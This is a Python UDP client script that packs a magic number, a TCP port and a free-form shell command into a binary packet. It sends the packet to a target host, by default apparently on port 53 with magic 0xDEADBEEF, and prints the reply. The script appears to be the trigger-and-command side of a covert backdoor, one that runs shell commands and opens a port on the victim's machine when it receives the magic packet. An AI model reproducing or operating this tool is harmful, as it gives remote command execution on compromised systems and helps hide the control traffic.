import socket 
import struct
from collections import namedtuple

# time out
# ======================================================

import signal
from contextlib import contextmanager

@contextmanager
def timeout(time):
	# Register a function to raise a TimeoutError on the signal.
	signal.signal(signal.SIGALRM, raise_timeout)
	# Schedule the signal to be sent after ``time``.
	signal.alarm(time)

	try:
		yield
	except TimeoutError:
		pass
	finally:
		# Unregister the signal so it won't be triggered
		# if the timeout is not reached.
		signal.signal(signal.SIGALRM, signal.SIG_IGN)

def raise_timeout(signum, frame):
	raise TimeoutError


# client send packets
# ======================================================

bufferSize = 1024
FORMAT = "IH256s" # I = unsigned int, H = unsigned short, 256s = char[256]

def create_socket():
	UDPClientSocket = socket.socket(family = socket.AF_INET,
									type = socket.SOCK_DGRAM)   
	return UDPClientSocket


def build_packet(magic, port_number, shell_command):
	listen_package_t = namedtuple("listen_package_t",
							"m_magic m_port_number m_shell_command")
	tuple_to_send = listen_package_t( m_magic=magic,
							m_port_number=port_number,
							m_shell_command= shell_command.encode("ascii"))
	string_to_send = struct.pack(FORMAT, *tuple_to_send._asdict().values())
	return string_to_send


def send_packet(address, port, sock, packet):
	serverAddrPort = (address, port)
	sock.sendto(packet, serverAddrPort)


def receive_message(sock):
	msg = None
	with timeout(3):
		msgFromServer = sock.recvfrom(bufferSize)   
		msg = "msg from server: {}".format(msgFromServer[0].decode())
	if (msg == None):
		msg = "Time Out ..."
	return msg


def main(address, port, _magic, _port_number, _shell_command):
	try:
		sock = create_socket() 
		packet = build_packet(_magic, _port_number, _shell_command)
		send_packet(address, port, sock, packet)
		msg = receive_message(sock)
		sock.close()
		return msg
	except Exception as e:
		print(e)


if __name__ == '__main__':

	# ==== Manually Values ====
	# address = '192.168.146.130'
	# port = 53
	# _magic = 0xDEADBEEF
	# _port_number = 222
	# _shell_command = ""

	print("Hello, to send packets please enter the following data:")
	
	address = input("please enter the destination address (empty is your local address): ")
	
	try:
		port = int(input("please enter the destination port: "))
		_magic = int(input("please enter the magic number: "), 16)
		_port_number = int(input("please enter the new port for tcp: "))
	except Exception as e:
		print(e)
		exit(-1)
	
	_shell_command = input("please enter the shell command: ")

	print(main(address, port, _magic, _port_number, _shell_command))